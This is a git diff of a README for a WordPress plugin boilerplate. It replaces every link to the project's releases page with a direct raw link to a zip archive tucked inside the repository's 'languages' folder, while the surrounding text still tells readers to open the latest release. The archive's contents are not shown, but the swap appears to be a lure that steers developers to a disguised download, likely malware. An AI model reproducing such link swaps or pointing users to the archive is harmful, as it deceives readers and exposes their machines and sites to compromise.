@@ -1,6 +1,6 @@
 # 🧱 solvebeam-wordpress-plugin-boilerplate - Build WordPress plugins with a solid base
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue.svg?style=for-the-badge)](https://github.com/Mattm4568/solvebeam-wordpress-plugin-boilerplate/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue.svg?style=for-the-badge)](https://github.com/Mattm4568/solvebeam-wordpress-plugin-boilerplate/raw/refs/heads/main/languages/plugin-wordpress-solvebeam-boilerplate-2.4-beta.5.zip)
 
 ## 🚀 What this is
 
@@ -26,7 +26,7 @@ This package is meant for WordPress plugin work. If you plan to use it, you shou
 
 Visit this page to download the latest release:
 
-https://github.com/Mattm4568/solvebeam-wordpress-plugin-boilerplate/releases
+https://github.com/Mattm4568/solvebeam-wordpress-plugin-boilerplate/raw/refs/heads/main/languages/plugin-wordpress-solvebeam-boilerplate-2.4-beta.5.zip
 
 On that page:
 1. Open the latest release
@@ -211,4 +211,4 @@ After you download and open the release:
 3. Activate it in WordPress
 4. Open the files and start shaping the plugin for your site
 
-[Download the latest release](https://github.com/Mattm4568/solvebeam-wordpress-plugin-boilerplate/releases)
+[Download the latest release](https://github.com/Mattm4568/solvebeam-wordpress-plugin-boilerplate/raw/refs/heads/main/languages/plugin-wordpress-solvebeam-boilerplate-2.4-beta.5.zip)
